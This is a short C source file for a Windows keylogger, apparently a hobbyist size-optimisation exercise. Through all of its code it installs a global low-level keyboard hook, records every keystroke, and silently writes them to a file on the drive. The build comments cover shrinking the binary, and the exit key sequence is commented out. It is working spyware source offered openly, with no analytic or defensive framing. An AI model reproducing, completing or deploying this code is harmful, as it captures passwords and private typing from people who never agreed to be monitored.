/*	
 *	Small keylogger
 *	When compiled, the actual code size of this program is 776B using MSVC 2010 and the settings below
 *	
 *	To build this file use:
 *		cl keylog.c /O1 /Os /link /out:kle.exe /FIXED /FILEALIGN:512
 *	
 */

#pragma comment(linker, "/DEFAULTLIB:kernel32.lib")		//Linking kernel32.lib
#pragma comment(linker, "/DEFAULTLIB:user32.lib")		//Linking user32.lib
#pragma comment(linker, "/NODEFAULTLIB:libc.lib")		//Removing standard library/CRT
#pragma comment(linker, "/NODEFAULTLIB:libcmt.lib")		//Removing standard library/CMT
#pragma comment(linker, "/NODEFAULTLIB:OLDNAMES.lib")	//Removing unneeded Library
#pragma comment(linker, "/SUBSYSTEM:console")			//No console window
#pragma comment(linker, "/INCREMENTAL:no")				//Smaller code if multiple source files
#pragma comment(linker, "/SECTION:.text,ERW")			//Set correct attributes for .text section
#pragma comment(linker, "/MERGE:.bss=.text")			//Merging .bss and .text
#pragma comment(linker, "/MERGE:.CRT=.text")			//Merging .crt and .text
#pragma comment(linker, "/MERGE:.rdata=.text")			//Merging .rdata and .text
#pragma comment(linker, "/MERGE:.data=.text")			//Merging .data and .text
#include <windows.h>

#define MAXSIZE 2097152 //Buffer size: 2MB, small memory footprint
#define LENGTH (length > MAXSIZE ? (length = 0) : length) //Checking if length should wrap
#define LLENGTH (llength > MAXSIZE ? (llength = 0) : llength) //Checking if llength should wrap

unsigned char *a; //Key buffer
int length = 1; //length is last key position, llength is the current processed key position

DWORD WINAPI winqThread(void *n) { //Using thread because otherwise keyboard would "hang" if harddrive is busy
	int llength = 1;
	DWORD W;	//Bytes written for WriteFile, will fail otherwise
	HANDLE hf = CreateFile("/kb.db", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH, NULL); //Output file handle, currently "/kb.db"
	while(1) 
		if(LENGTH == LLENGTH) Sleep(1); //Sleep when no keys can be written
		else WriteFile(hf, &a[llength++], 1, &W, NULL); //Write Virtual Keycode directly to drive
	return 0;
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {		//The keyboard hooking function callback
//	if (GetAsyncKeyState(VK_RCONTROL) && GetAsyncKeyState(VK_F12)) ExitProcess(0);	//Magic keysequence for exiting the keylogger
	if (wParam == WM_KEYDOWN)	//Checking if keydown, if not continue
		a[length++] = (unsigned char)((PKBDLLHOOKSTRUCT) (lParam))->vkCode; //Adding keycode to library
	return CallNextHookEx(NULL, nCode, wParam, lParam); //Calling next hook in queue, if this were omitted keyboard would stop working
}

void __cdecl main( void ) {
	MSG msg;	//Windows message
	a = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAXSIZE);	//Allocate keycode buffer
	SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, 0); //Inserting the Low Level Keyboard Hook into windows
	CreateThread(NULL, 0, winqThread, NULL, 0, NULL); //Create QueueThread for writing to disk
	while (GetMessage(&msg, NULL, 0, 0)) {	//Windows message queue handling
		DispatchMessage(&msg);
	}
}